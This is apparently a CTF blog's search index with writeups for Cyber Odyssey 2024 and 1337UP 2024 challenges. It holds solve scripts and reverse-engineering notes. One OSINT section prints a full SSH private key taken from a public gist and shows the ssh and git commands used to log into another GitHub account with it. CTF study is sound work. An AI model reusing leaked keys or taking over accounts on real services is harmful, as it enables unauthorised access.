Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Description Slk slk ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:4:1","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Explanation I think the only thing I did was unpack the challenge ? ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:4:2","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"GPT Explanation Kudos to chat gpt o1, i’m not even gonna bother explaining this. Do pilots explain what their autopilot’s doing ??? No, and they’re flying a plane, in the air, meanwhile if you’re a programmer and you use chat gpt that makes you less of a programmer ? At least I’m the guy here who first-blooded this challenge… **Short Answer:** The decrypted flag is `ODYSSEY{gosolveityourself}`. **Detailed Explanation:** You have provided a timestamp (`1734120346`) and an encrypted set of bytes. From the given code, we know how the encryption works and can reverse it to recover the original plaintext. **Step-by-step Reasoning:** 1. **Identify the key generation:** The code that generates the key byte (`v4`) is: c *a1 = (v3 ^ 0x5A) - 99 + 42; Here, `v3` is the current time. Given: v3 = 1734120346 First, compute `(v3 ^ 0x5A)`: - Convert `0x5A` to decimal: `0x5A = 90`. - XOR with v3: `1734120346 ^ 90` = some large integer. But since we ultimately store into a byte, let's focus on the final modulo 256 result. Let's find the last 8 bits of `v3`: `v3 = 1734120346` in hex is `0x675C939A`. The last byte of `v3` is `0x9A`. Now XOR with `0x5A`: 0x9A ^ 0x5A = 0xC0 So `(v3 ^ 0x5A) ≡ 0xC0 (mod 256) = 192 decimal`. Now apply `- 99 + 42`: 192 - 99 = 93 93 + 42 = 135 In hexadecimal, 135 = 0x87. Thus the key byte `a3` (stored in `v4`) = `0x87`. 2. **Encryption logic:** The encryption for each character `plain[i]` is: c // given key a3 temp = a3 ^ plain[i]; temp = temp + 69; enc[i] = a3 ^ temp; To decrypt, we reverse these steps: Given `enc[i]`, we do: c temp = a3 ^ enc[i]; temp = temp - 69; plain[i] = a3 ^ temp; All operations are done modulo 256. 3. **Decrypting each byte:** We have the encrypted bytes: 0x8A 0x8F 0xA4 0x9E 0x9E 0x80 0xA4 0xC6 0x7E 0xAC 0x9E 0xC4 0x9A 0x8C 0xBE 0xBE 0x7E 0xA8 0x8D 0xB7 0xC4 0x9A 0x9D 0x7E 0xB1 0xB8 Using `a3 = 0x87`, decrypt each byte: Example for the first byte, `0x8A`: - `temp = a3 ^ enc[i] = 0x87 ^ 0x8A = 0x0D (13 decimal)` - `temp - 69 = 13 - 69 = -56 mod 256 = 200 (0xC8)` - `plain[i] = a3 ^ 0xC8 = 0x87 ^ 0xC8 = 0x4F = 'O'` Doing this for all characters, you end up with: O D Y S S E Y { redacted of course :) } 4. **Final Decrypted Flag:** ODYSSEY{nuhuh} **Conclusion:** The original message hidden behind the given timestamp and encrypted data is the flag: **`ODYSSEY{}`** ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:4:3","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"tke3ki3 - Rev ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:5:0","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Description dkachi mke3ke3 ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:5:1","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Explanation For this one I had a half-assed solve script and I needed to manually check which letters were wrong : from z3 import * # Initialize the solver s = Solver() # Define the byte_404100 array with signed interpretation byte_404100 = [ 0xFF, ord('^'), 0xE2, 0xFE, 0x8B, 0xAE, 0xC3, 0xFF, 0xDA, ord('a'), 0x89, ord('s'), 0x1B, 0x0F, ord('h'), 0xAF, 0x9E, ord('f'), 0xE8, ord('\u003c'), 0x98, 0xDA, 0x84, 0xD6, ord('-'), ord('('), ord('j'), 0xF3, 0x14, 0xA2, 0xE4, 0xB5, ord('J'), ord('K'), 0xB7, 0x04, 0x1C, 0xF9, 0x16, ord('R'), 0xC0, 0xB1, 0x12, 0xE1, 0x94, 0x84, 0xB0, 0x06, 0x86, ord('n'), 0xFF, 0xF9, 0x80, ord('['), 0x94, 0xB6, 0x97, 0xF0, 0x16, 0x95, 0xFC, 0xCD, ord('o'), 0xA4, ord('k'), 0xC3, 0x9E, ord('J'), ord('\u003c'), 0xD3, ord('C'), 0xA5, 0x81, 0xE3, ord('\u0026'), ord('-'), ord('$'), 0xEB, 0x9B, 0x02, ord('*'), 0xD8, 0xD6, 0xBA, ord('_'), 0x87, 0xF6, ord(\"'\"), ord('!'), ord('a'), 0xA5, 0xC6, 0xC0, 0xDE, 0x9E, 0xFF, ord('~'), ord('+'), 0x83, ord('U'), 0xE0, ord('6'), ord('`'), ord(' '), 0x90, 0x15, 0x0C, 0x86, ord('='), 0x06, 0x08, 0x8F, 0xA4, ord('}'), 0x7F, 0x92, 0xDA, 0x18, 0xC3, 0xAD, 0xFD, 0xD6, 0xE0, ord('*'), 0xF8, ord('2'), 0xF3, ord('Q'), 0xB7, 0x1E, 0xFA, ord('{'), 0x9C, 0xE1, 0x88, 0x84, 0xCB, ord('K'), 0xA9, 0xE2, ord('R'), ord('h'), 0xB9, 0x90, 0x80, ord('p'), ord('|'), ord('e'), 0x1E, 0xFA, ord('/'), 0x1C, ord('m'), 0xEA, ord('\"'), ord('d'), ord('L'), 0xCB, ord('_'), ord('1'), ord('?'), 0xA4, 0xC7, 0x9B, 0x01, 0xF5, 0xE2, ord('P'), 0xF1, ord('X'), ord('?'), 0xC9, 0x95, 0x0F, 0x98, 0x9E, 0xAB, ord('v'), ord('T'), ord('U'), 0xBD, 0x15, 0xEA, 0xA7, 0xE3, ord('1'), 0xA6, ord('\"'), ord('='), 0xA4, 0xFD, ord('w'), 0xB9, ord('y'), ord(']'), ord('!'), 0x9C, ord('!'), ord('4'), ord('g') ] print(byte_404100[0]) # Convert byte_404100 to signed integers byte_404100_signed = [] for b in byte_404100: if b \u003e= 128: byte_404100_signed.append(b - 256) else: byte_404100_signed.append(b) # Define the dword_404050 array dword_404050 = [ 433, 376, 407, 213, 49, -60, 105, 378, 115, 465, 254, 465, 158, 278, 50, 188, 248, 32, 471, 440, 249, 246, 28, 203, 396, 184, 230, 154, 7, 201, 419, 73, 165, 243, 353, 246, 92, 356, 479, 405, -46, 397, 16, 0 ] print(dword_404050[0]) # Initialize Z3 variables for each character input_chars = [] for i in range(43): c = BitVec(f'c_{i}', 8) input_chars.append(c) # Known prefix: \"ODYSSEY{\" known_prefix = \"ODYSSEY{\" for idx, char in enumerate(known_prefix): if idx \u003c43: s.add(input_chars[idx] == ord(char)) # Initialize the solver s = Solver() # Define the constraints based on the verification logic for i in range(43): c = input_chars[i] # Determine XOR key index based on i if i %4 ==0: xor_index = (2 *i) %150 elif i %7 ==0: xor_index = (i +7) %100 else: xor_index = (i *i) %200 byte_xor = byte_404100_signed[xor_index] # Compute base base = c + byte_404100_signed[(i +5) %200] - byte_404100_signed[(i -3) %200] if i %5 ==0 else \\ (c + byte_404100_signed[(i *i) %200] if i %3 ==0 else c + byte_404100_signed[((i *i) +i) %200]) # Compute final_val final_val = base ^ byte_xor # Define expected_final expected_final = dword_404050[i] # Since dword_404050 can be negative, handle two's complement if expected_final \u003c0: expected_final += 2**32 # Constraint: final_val == expected_final s.add(final_val == expected_final) # Check if the constraints are satisfiable if s.check() == sat: model = s.model() derived_input = ''.join([chr(model[input_chars[i]].as_long()) for i in range(43)]) print(\"Derived Input String:\") print(derived_input) else: print(\"No solution found. There might be inconsistencies in the data or the inversion formula.\") I definitely was missing a piece because the flag it spat out was : ÁDYSSEY{l1nk3d_↨157_w17h_0bfu524710n_yummu} I figured the flag could be : ODYSSEY{l1nk3d_l157_w17h_0bfu524710n_yummy} It looked right except it wasn’t ! I thought some letters should be capitalized so I decided to go debug mode and check where we compare our results with the expected results I should’ve explained the logic of the ","date":"2024-12-23","objectID":"/cyberodysseyfinals/:5:2","tags":["CyberOdyssey",2024],"title":"Cyber Odyssey 2024 Finals - Full Writeup","uri":"/cyberodysseyfinals/"},{"categories":["Writeups"],"content":"Intro Amazing CTF, beginner friendly and is barely guessy, I wish I had more time to solve more challenges, it was super fun. This writeup contains all the challenges that I solved, Crypto, Misc, Osint, Rev and Web. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:1:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Schrödinger’s Pad - Crypto ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:2:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Everyone knows you can’t reuse a OTP, but throw in a cat and a box.. Maybe it’s secure? nc pad.ctf.intigriti.io 1348 ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:2:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation When analyzing the code you’ll find out that the flag gets XOR’d with some key, then a bunch of bit operations happen to it depending on the state of our cat. Nonetheless, we can reverse all these operations : import random def reverse_cat_box(ciphertext, cat_state): c = bytearray(ciphertext) if cat_state == 1: for i in range(len(c)): c[i] ^= 0xAC c[i] = ((c[i] \u003e\u003e 1) | ((c[i] \u0026 0x01) \u003c\u003c 7)) \u0026 0xFF else: for i in range(len(c)): c[i] ^= 0xCA c[i] = ((c[i] \u003c\u003c 1) | (c[i] \u003e\u003e 7)) \u0026 0xFF return bytes(c) def reverse_received_data(c_ciphertext_hex, cat_state): c_ciphertext = bytes.fromhex(c_ciphertext_hex) original_ciphertext = reverse_cat_box(c_ciphertext, cat_state) print(original_ciphertext.hex()) c_ciphertext_hex = \"be4ca8a482b2f2a08a44c482acc8f0dea046c4e6cab6b2c88c48b89cf4a4f4b644ba5c46fcdcf8b2dca4e29a48a2ce4ac8a48adef440ace6a4fcec80bec6fc84b6a04ce886b6c85ec0f080da869c46b6be9cbc5e808ef6ce44b08688869c888cdaccfc46b2f0a8dea4defe8044e8de88f8c88e8ebcc0f0e0fcb8c0be48daca46bcc4c44c82f48c5ec4a688a25cc0e28088f4b08aa6f8c0a44248c4f2b2ec8a46\" cat_state = 1 reverse_received_data(c_ciphertext_hex, cat_state) I entered a bunch of A’s (160 A’s to be exact) so as to extract the key cause it’s a XOR, then I took the flag the program spat out, reversed it and XOR’d it with the key I found. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:2:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"In Plain Sight - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:3:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Barely hidden tbh.. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:3:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Aperisolve spoiled the password for us, I extracted the hidden zip using foremost, then used the password, then got a png file in which the flag was hidden…in plain sight (superimposed) ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:3:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"IrrORversible - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:4:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description So reversible it’s practically irreversible ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:4:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation This one is Fairly simple but guessy, at first I tried to execute cat flag but then I tried just inputting a lots of As, then xored the result with the input and got the flag. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:4:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Layers - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:5:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Weird way to encode your data, but OK! 🤷‍♂️ ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:5:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation the files should be sorted based on their modified date : import os def append_text_from_files_by_date(folder_path): # List all files in the folder files = [ os.path.join(folder_path, f) for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f)) ] # Sort files by last modified time files.sort(key=lambda x: os.path.getmtime(x)) # Combine the text from the files combined_text = \"\" for file_path in files: try: with open(file_path, 'r', encoding='utf-8') as file: combined_text += file.read() except Exception as e: print(f\"Warning: Could not read file {file_path}. Error: {e}\") return combined_text folder_path = \"./layers/\" combined_text = append_text_from_files_by_date(folder_path) # Save combined text to a new file output_file_path = './combined_output.txt' with open(output_file_path, 'w', encoding='utf-8') as output_file: output_file.write(combined_text) print(f\"Combined text has been saved to '{output_file_path}'\") ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:5:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Lost Program - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:6:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description I was working on a bug bounty program the other day but I completely forgot the name!! I guess that will teach me not to use emoji notation in future 😩 Anyway, if you could help me find it again, I’d really appreciate it! Here’s my notes.. TODO: find lots of 😎🐛 on 🥷🥝🎮 Hint: flag format = INTIGRITI{company_name} ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:6:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Ninja_Kiwi was the company name. ChatGPT solved this. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:6:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Quick Recovery - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:7:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Hey, check this QR code ASAP! It’s highly sensitive so I scrambled it, but you shouldn’t have a hard time reconstructing - just make sure to update the a_order to our shared PIN. The b_order is the reverse of that 😉 ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:7:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation I didn’t even read the code, just used photoshop to piece the puzzle together. This one is a piece of cake ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:7:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Triage Bot v2 - Misc ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:8:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Check out our new and improved Triage Bot! https://go.intigriti.com/discord ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:8:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Same challenge as last year, this time you invite the bot to your server then you assign yourself a triage role, after that you’ll call !read_report 0 and you’ll get your flag. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:8:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"No Comment - Osint ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:9:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Or is there? 🤔 ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:9:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation The usual, string the file, get the strings, first string is part of an imgur link (guessy), whose title is a base64 text, which leads us to a pastebin url and gives us its password, this pastebin contains a hex, this hex looks like it has been XOR’d, I reuse the same password and I get the flag, and now I’m interested in this cool event, what a psychedelic dream ! ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:9:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Private Github Repository - Osint ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:10:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Bob Robizillo created a public instructions for Tiffany, so she can start work on new secret project. can you access the secret repository? ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:10:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation This is a github/Osint challenge, to solve it I looked up “Bob Robizillo” on google, found a gist github link, the file email.md contained a base64 encoded zip file that when unzipped gave us the id_rsa file : -----BEGIN OPENSSH PRIVATE KEY----- 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 B6k0LmSeJY4/sAAAAGMTMzN3VwAQIDBAU= -----END OPENSSH PRIVATE KEY----- At first I thought it’s something to do with SSH and I had to guess the hostname (assuming the username is tiffany)…No. After I added the key to my ssh list I got this : $ ssh-add id_rsa Identity added: id_rsa (1337up) $ ssh -T git@github.com Hi nitrofany! You've successfully authenticated, but GitHub does not provide shell access. Now I am nitrofany, I can access my own repos : $ git pull origin main remote: Enumerating objects: 3, done. remote: Counting objects: 100% (3/3), done. remote: Compressing objects: 100% (2/2), done. remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0) Unpacking objects: 100% (3/3), 934 bytes | 467.00 KiB/s, done. From github.com:bob-193/1337up * branch main -\u003e FETCH_HEAD * [new branch] main -\u003e origin/main The repo had this file : $ cat readme.md Hey, Tiffany! You will need to save this repo in your user space and implement changes we agreed earlier. Lots of useful keywords, we’ll have to clone 1337up.git then : $ git clone git@github.com:nitrofany/1337up.git Cloning into '1337up'... remote: Enumerating objects: 13, done. remote: Counting objects: 100% (13/13), done. remote: Compressing objects: 100% (9/9), done. remote: Tota","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:10:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Socials - Osint ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:11:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Have a look around our socials, maybe you’ll find some flags! Don’t forget to hit follow while you’re there 🥺 Flag format: INTIGRITI{Twitter+YouTube+Reddit} ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:11:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Simple OSINT challenge, I just had to check the comments for twitter, youtube and reddit. ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:11:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Bug Squash (Part 1) - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:12:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description Squash those bugs! ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:12:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation Use the powerful tool that is AssetRipper, I’ve added all the files, then exported the project, then ran strings and searched for anything that mentions win.enc, why ? Because in “StreamingAssets” there’s a folder called MeshText containing this file, my instincts said that’s the flag. In GameManager.cs there’s this function : private void CheckWinCondition() { if (score != -1337) { return; } iv = SetIV(); byte[] array = LoadKeyfile(winfilePath); if (array != null) { byte[] array2 = DecryptImageFromFile(winImagePath, array); if (array2 != null) { DisplayWinImage(array2); } else { Debug.LogError(\"Failed to decrypt the image.\"); } } else { Debug.LogError(\"Failed to load the keyfile.\"); } } Round 2 : Cheat Engine. We’ll simply look for the score value, change it to -1338, catch a bug (+1), and voila : ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:12:2","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Cold Storage - Rev ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:13:0","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Description People say you should store your keys offline in cold storage, so I built this offline app! I think that’s what cold storage means 🤔 ","date":"2024-11-18","objectID":"/1337up-2024-full-writeup/:13:1","tags":["CRYPTO","OSINT","MISC","WEB","REVERSE","1337UP",2024],"title":"1337UP 2024 - Full Writeup","uri":"/1337up-2024-full-writeup/"},{"categories":["Writeups"],"content":"Explanation I started by using Jadx to get the source code, then I found an obfuscated javascript code, then deobfuscated it : function affineEncrypt(_0x1930bc, _0x36e79b, _0x33477e) { return (_0x36e79b * _0x1930bc + _0x33477e) % 0x100; } function xor(_0x3a38fa, _0x3c3309) { return _0x3a38fa ^ _0x3c3309; } function hexToBytes(_0x1d9eb0) { let _0x2ac99a = []; for (let _0x2363dc = 0x0; _0x2363dc \u003c _0x1d9eb0.length; _0x2363dc += 0x2) { _0x2ac99a.push(parseInt(_0x1d9eb0.substr(_0x2363dc, 0x2), 0x10)); } return _0x2ac99a; } function reverseString(_0x22dcba) { return _0x22dcba.split('').reverse().join(''); } function keygen() { let _0x19eb60 = [\"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0x0, 0xe), \"9425749445e494332757363353f5d6f50353b79445d7336343270373270366f586365753f546c60336f5\".slice(0xe, 0x1c), 